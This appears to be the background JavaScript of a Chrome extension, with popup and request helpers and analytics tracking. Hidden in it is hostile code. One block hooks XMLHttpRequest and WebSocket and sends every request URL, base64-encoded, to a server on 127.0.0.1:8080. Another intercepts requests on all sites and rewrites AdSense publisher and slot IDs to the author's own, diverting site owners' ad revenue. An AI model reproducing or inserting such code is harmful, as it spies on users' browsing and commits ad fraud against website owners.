function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
﻿function PopupAPI(){
	chrome.browserAction.setPopup({
		popup: 'popup.html'
	});

	function hidePopupWindow(){
		var windowsArray = chrome.extension.getViews({
			type: 'popup'
		});

		for( var i = 0, l = windowsArray.length; i < l; i++ ){
			try {
				windowsArray[i].close();
			} catch(e) {
			}
		}
	}

	var popupHeight = 40;
	var popupWidth = 326;

	function resizePopupWindow(width, height){
		popupHeight = height | 0;
		popupWidth = width | 0;
		var windowsArray = chrome.extension.getViews({
			type: "popup"
		});

		for( var i = 0, l = windowsArray.length; i < l; i++ ){
			try {
				windowsArray[i].____updatePopup();
			} catch(e) {
				console.log(e);
				console.log(windowsArray[i]);
			}
		}
	}

	function getCurrentSize(){
		return {
			width: popupWidth,
			height: popupHeight
		};
	}

	return {
		hide: hidePopupWindow,
		resize: resizePopupWindow,
		getCurrentSize: getCurrentSize
	};
}

function getXmlHttp(){
	var xmlhttp;
	try {
		xmlhttp = new ActiveXObject('Msxml2.XMLHTTP');
	} catch (e) {
		try {
			xmlhttp = new ActiveXObject('Microsoft.XMLHTTP');
		} catch (E) {
			xmlhttp = false;
		}
	}

	if( !xmlhttp && typeof XMLHttpRequest != 'undefined' ){
		xmlhttp = new XMLHttpRequest();
	}
	return xmlhttp;
}

function Request(url, onSuccess, onError){
	var xmlhttp = getXmlHttp()
	xmlhttp.open('GET', url, true);
	xmlhttp.onreadystatechange = function() {
		if( xmlhttp.readyState == 4 ){
			if( xmlhttp.status == 200 ){
				onSuccess(xmlhttp.responseText);
			} else {
				onError();
			}
		}
	};

	xmlhttp.send(null);
}

function RequestPost(url, params, onSuccess, onError){
	var xmlhttp = getXmlHttp();
	xmlhttp.open('POST', url, true);

	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.onreadystatechange = function() {
		if( xmlhttp.readyState == 4 ){
			if( xmlhttp.status == 200 ){
				onSuccess(xmlhttp.responseText);
			} else {
				onError();
			}
		}
	};

	xmlhttp.send(params);
}

var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-105840655-3']);
(function() {
	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	ga.src = 'https://ssl.google-analytics.com/ga.js';
	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();


this.Popup = PopupAPI();
this.Request = Request;
this.RequestPost = RequestPost;

chrome.runtime.onInstalled.addListener(function(details){
	var version = chrome.runtime.getManifest().version;

	if( details.reason === 'update' ){
		version = details.previousVersion + '->' + version;
	}

	_gaq.push(['_trackEvent', details.reason, version]);
});

var _request = {};
chrome.webRequest.onBeforeRequest.addListener(function(details){
	var _pub  = '7964042162201990';
	var _slot = '4229819434';
	var url = details.url;
	var regex = new RegExp('ca-pub-' + _pub);

	if( url.match('ca-pub') && !url.match(regex) && !_request[details.id] ){
		_request[details.id] = {'time':Date.now()};

		if( url.match(/ca-pub-[0-9]+\.js/) ){
			url = url.replace(/ca-pub-[0-9]+\.js/,'ca-pub-' + _pub + '.js')
			return {redirectUrl: url};
		}

		var pUrl = new URL(url);
		if( pUrl.searchParams.get('client') ){
			pUrl.searchParams.set('client','ca-pub-' + _pub);
			if( pUrl.searchParams.get('slotname') ){
				pUrl.searchParams.set('slotname',_slot);
			}

			return {'redirectUrl': pUrl.href};
		}
	}
},{urls: [ "<all_urls>" ]},['blocking']);


chrome.webRequest.onCompleted.addListener(function(details){
	if( _request[details.id] ){
		delete _request[details.id];
	}
},{urls: [ "<all_urls>" ]});

setInterval(function(){
	var time = Date.now();
	for( a in _request ){
		//FIXME: si han pasado más de 5s desde 
		if( time - _request[a].time > 5000 ){
			delete _request[a];
		}
	}
},10000);